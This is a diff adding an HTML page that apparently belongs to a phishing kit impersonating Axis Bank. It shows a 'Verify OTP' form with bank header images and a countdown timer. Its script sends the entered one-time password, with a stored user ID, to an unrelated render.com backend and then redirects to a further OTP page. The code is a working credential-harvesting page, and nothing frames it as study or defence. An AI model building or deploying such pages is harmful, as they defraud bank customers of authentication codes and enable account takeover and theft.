@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Axis Omni Channel</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0dc8c8;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+    }
+
+    .header-container {
+      background: white;
+      color: black;
+      padding: 1px;
+      text-align: center;
+      height: 110px;
+      border: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 1000;
+      box-shadow: none;
+    }
+
+    .main-content {
+      margin-top: 110px; /* Adjusted to prevent overlap with header */
+      padding: 0 20px;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+    }
+
+    .footer-container {
+      width: 100%;
+      height: 100px; /* You can adjust this value */
+      background: url('footer.jpg') no-repeat center center;
+      background-size: cover;
+      position: relative;
+      margin-top: auto; /* Push the footer to the bottom */
+    }
+    .timer {
+      color: rgb(147, 4, 4);
+      font-weight: bold;
+      font-size: 1.25rem;
+    }
+
+    .footer-container {
+      width: 100%;
+      height: 100px; /* You can adjust this value */
+      background: url('footer.jpg') no-repeat center center;
+      background-size: cover;
+      position: relative;
+      margin-top: auto; /* Push the footer to the bottom */
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body class="bg-white text-black min-h-screen flex flex-col items-center">
+
+  <div class="header-container">
+    <img src="header.jpg" alt="Axis Bank">
+  </div>
+
+  <div class="main-content">
+    <div class="form-container">
+      <div class="mb-6 text-center">
+        <h1 class="text-2xl font-extrabold text-gray-800">Verify OTP</h1>
+        <p class="text-gray-600 text-sm">We sent a code to your registered mobile number. Enter it below to proceed.</p>
+        <div id="timer" class="timer mb-4">
+          Please wait for <span id="countdown">60</span> seconds
+        </div>
+        <div id="otp-status" class="text-green-500 font-semibold hidden">
+          OTP sent successfully!
+        </div>
+      </div>
+
+      <form id="otp-form" class="space-y-4">
+        <div>
+          <label for="otp" class="block text-gray-700 text-sm font-semibold mb-2">One-Time Password (OTP)</label>
+          <input 
+            type="text" 
+            id="otp" 
+            name="otp" 
+            class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-0 focus:border-gray-300"
+            placeholder="Enter your OTP"
+          >
+        </div>
+        <div class="flex items-center justify-center">
+          <button 
+          id="verify-btn" 
+          class="w-full text-white font-medium hover:bg-[#7e405d] focus:outline-none focus:ring-1 focus:ring-[#69354a]" 
+          style="background-color: #8B004B; border-radius: 10px; height: 50px; width: 350px; text-align: center; line-height: 50px; display: inline-block; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);" 
+          type="button"
+        >
+          Verify OTP
+        </button>
+        </div>
+        <div id="loading" class="hidden text-center mt-4">
+          <div class="w-8 h-8 border-t-4 border-green-600 border-solid rounded-full animate-spin mx-auto"></div>
+          <p class="text-gray-700 mt-2">Verifying...</p>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="footer-container"></div>
+
+  <script>
+    // Countdown Timer
+    let countdownValue = 60;
+    const countdownElement = document.getElementById('countdown');
+    const otpStatusElement = document.getElementById('otp-status');
+
+    const countdownInterval = setInterval(() => {
+      if (countdownValue > 0) {
+        countdownValue--;
+        countdownElement.textContent = countdownValue;
+      } else {
+        clearInterval(countdownInterval);
+        otpStatusElement.classList.remove('hidden'); // Show OTP sent message
+      }
+    }, 1000);
+
+    document.getElementById('verify-btn').addEventListener('click', () => {
+      const otp = document.getElementById('otp').value;
+
+      // Dynamically fetch userId from localStorage
+      const userId = localStorage.getItem('userId');
+      if (!userId) {
+        alert('User ID not found. Please log in again.');
+        return;
+      }
+
+      const loadingSpinner = document.getElementById('loading');
+      loadingSpinner.classList.remove('hidden'); // Show loading spinner
+
+      // Simulate delay for better UX before submitting the OTP
+      setTimeout(() => {
+        fetch('https://backend-e2yf.onrender.com/api/update-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ otp, userId }), // Include userId in the request
+        })
+          .then((response) => {
+            if (response.ok) {
+              window.location.href = 'thirdotp.html'; // Redirect to third-otp.html
+            } else {
+              alert('Failed to verify OTP.');
+            }
+          })
+          .catch(() => alert('Error verifying OTP. Please try again.'))
+          .finally(() => {
+            loadingSpinner.classList.add('hidden'); // Hide spinner
+          });
+      }, 2000); // Simulate 2s delay
+    });
+</script>
+</body>
+</html>
